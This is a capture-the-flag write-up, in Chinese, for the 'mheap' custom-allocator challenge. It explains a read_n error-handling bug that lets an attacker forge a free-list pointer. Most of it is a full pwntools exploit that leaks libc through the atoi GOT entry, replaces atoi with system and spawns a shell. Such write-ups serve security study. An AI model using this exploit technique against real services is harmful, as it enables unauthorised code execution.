# mheap

程序定义了自己的分配规则
程序的`chunk`：
```c
struct chunk{
    size_t size;
    void* next; //only used after free
    char buf[size];
}

```

漏洞点在

```c
_int64 __fastcall read_n(char *buf, signed int len)
{
  __int64 result; // rax
  signed int v3; // [rsp+18h] [rbp-8h]
  int v4; // [rsp+1Ch] [rbp-4h]

  v3 = 0;
  do
  {
    result = (unsigned int)v3;
    if ( v3 >= len )
      break;
    v4 = read(0, &buf[v3], len - v3);
    if ( !v4 )
      exit(0);
    v3 += v4;
    result = (unsigned __int8)buf[v3 - 1];
  }
  while ( (_BYTE)result != 10 );
  return result;
}
```
当`buf+len`的地址比`mmap`的尾部还要大时，`read`返回-1，然后就可以向上读，伪造一个`next`指针即可


```python=
from pwn import *

def cmd(command):
	p.recvuntil("Your choice: ")
	p.sendline(str(command))

def add(idx,sz,content=''):
	cmd(1)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Input size: ")
	p.sendline(str(sz))
	if content:
		p.recvuntil("Content: ")
		p.send(content)
	
def show(idx):
	cmd(2)
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def dele(idx):
	cmd(3)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	
def edit(idx,content):
	cmd(4)
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.send(content)
	

def main(host,port=9999):
	global p
	if host:
		p = remote(host,port)
	else:
		p = process("./mheap")
		gdb.attach(p,"b *0x000000000040159B")
	
	add(0,0xfb0,"A"*0x10+'\n')
	add(0,0x10,"A"*0x10)
	dele(0)
	add(1,0x60,p64(0x00000000004040d0)+'A'*0x2f+'\n')
	add(0,0x23330fc0-0x10,"A"*0x8+p64(elf.got["atoi"])*2+'\n')
	show(1)
	libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["atoi"]
	info("libc : " + hex(libc.address))
	edit(1,p64(libc.symbols["system"])+'\n')
	p.recvuntil("Your choice: ")
	p.sendline("/bin/sh\x00")
	
	p.interactive()
	
if __name__ == "__main__":
	libc = ELF("./libc-2.27.so",checksec=False)
	elf = ELF("./mheap",checksec=False)
	main(args['REMOTE'])

```
